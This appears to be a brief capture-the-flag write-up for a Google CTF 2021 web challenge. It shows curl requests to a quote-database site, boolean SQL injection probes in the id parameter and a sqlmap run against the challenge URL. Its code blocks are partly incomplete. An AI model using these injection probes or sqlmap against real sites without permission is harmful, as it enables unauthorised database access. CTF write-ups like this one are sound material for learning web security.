# Unknown - Prison Cell
Category: Web
## Description
> You don’t manage to disarm the guard, he is quicker than you are. He knocks you out, and when you wake up you’re inside a prison cell, but it doesn’t seem like you’re on a boat anymore, you must be inside the headquarters on the secret island! The cell is claustrophobic, with rusty iron bars and a bed of concrete.

## Solution
We get a simple website:
```console
┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ curl https://quotedb-web.2021.ctfcompetition.com/

  Here's the quote of the day for you: 
    "It doesn't help to fight crime to put people in prison who are innocent." - Stephen Breyer

As the website suggests, it's possible to access a specific quote directly:
```console
┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ curl https://quotedb-web.2021.ctfcompetition.com/?id=7

Since this is a quote DB, it's very tempting to try SQL injection:
```console
┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ curl -G https://quotedb-web.2021.ctfcompetition.com/ --data-urlencode "id=4 AND 1=1"

└─$ curl -G https://quotedb-web.2021.ctfcompetition.com/ --data-urlencode "id=4 AND 1=0"
    Quote DB

```
We'll let `sqlmap` do the rest:
```console
┌──(user@kali)-[/media/sf_CTFs/google/14_Unknown_-_Prison_Cell]
└─$ sqlmap -u https://quotedb-web.2021.ctfcompetition.com/?id=4
